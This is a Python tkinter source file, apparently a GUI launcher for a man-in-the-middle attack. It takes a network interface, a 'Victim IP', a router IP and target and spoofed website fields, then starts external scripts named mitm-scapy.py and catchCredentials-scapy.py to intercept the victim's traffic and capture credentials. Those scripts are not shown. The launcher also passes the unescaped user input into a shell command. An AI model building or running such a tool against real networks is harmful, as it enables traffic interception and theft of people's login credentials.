from tkinter import *
from subprocess import Popen
import os
import signal


#Create Window
window = Tk()


#Interface Frame
iface_frame = Frame(window)
iface_frame.pack(side=TOP, fill=X)

#Interface label
iface_label = Label(iface_frame, text="Interface")
iface_label.pack(side=TOP)

#Interface Input
iface_text = StringVar()
iface_input = Entry(iface_frame, textvariable=iface_text, width=30)
iface_input.pack(side=TOP, padx=10, pady=10)

#---------------------------------------------

#IP Frame
IP_frame = Frame(window)
IP_frame.pack()

#----------------------------------------------

#Victim IP Frame
victimIP_frame = Frame(IP_frame)
victimIP_frame.pack(side=LEFT)

#Victim IP Label
victimIP_label = Label(victimIP_frame, text="Victim IP")
victimIP_label.pack(side=TOP)

#Victim IP Input
victimIP_text = StringVar()
victimIP_input = Entry(victimIP_frame, textvariable=victimIP_text, width=30)
victimIP_input.pack(side=TOP, padx=10, pady=10)

#------------------------------------------------

#VRouter IP Frame
routerIP_frame = Frame(IP_frame)
routerIP_frame.pack(side=RIGHT)

#Router IP Label
routerIP_label = Label(routerIP_frame, text="Router IP")
routerIP_label.pack(side=TOP)

#Router IP Input
routerIP_text = StringVar()
routerIP_input = Entry(routerIP_frame, textvariable=routerIP_text, width=30)
routerIP_input.pack(side=TOP, padx=10, pady=10)

#---------------------------------------------

#Website Frame
website_frame = Frame(window)
website_frame.pack()

#---------------------------------------------

#Target Website Frame
targetWebsite_frame = Frame(website_frame)
targetWebsite_frame.pack(side=LEFT)

#Target Website Label
targetWebsite_label = Label(targetWebsite_frame, text="Target Website")
targetWebsite_label.pack(side=TOP)

#Target Website Input
targetWebsite_text = StringVar()
targetWebsite_input = Entry(targetWebsite_frame, textvariable=targetWebsite_text, width=30)
targetWebsite_input.pack(side=TOP, padx=10, pady=10)

#---------------------------------------------

#Spoofed Website Frame
spoofedWebsite_frame = Frame(website_frame)
spoofedWebsite_frame.pack(side=RIGHT)

#Spoofed Website Label
spoofedWebsite_label = Label(spoofedWebsite_frame, text="Spoofed Website")
spoofedWebsite_label.pack(side=TOP)

#Spoofed Website Input
spoofedWebsite_text = StringVar()
spoofedWebsite_input = Entry(spoofedWebsite_frame, textvariable=spoofedWebsite_text, width=30)
spoofedWebsite_input.pack(side=TOP, padx=10, pady=10)

#---------------------------------------------

def launchScripts():
    if iface_text.get() != "" and victimIP_text.get() != "" and routerIP_text.get() != "":
        global process1
        global process2
        process1 = Popen("python3 scripts/mitm-scapy.py " + iface_text.get() + " " + victimIP_text.get() + " " + routerIP_text.get(), shell=True, preexec_fn=os.setsid)
        process2 = Popen("python3 scripts/catchCredentials-scapy.py ", shell=True, preexec_fn=os.setsid)
        
def stopScripts():
    os.killpg(os.getpgid(process1.pid), signal.SIGTERM)
    os.killpg(os.getpgid(process2.pid), signal.SIGTERM)

#Buttons Frame
buttons_frame = Frame(window)
buttons_frame.pack(side=BOTTOM, fill=X)

#Start Button
start_button = Button(buttons_frame, text="START", command=launchScripts)
start_button.pack()

#Stop Button
stop_button = Button(buttons_frame, text="STOP", command=stopScripts)
stop_button.pack()


#Launch GUI
window.mainloop()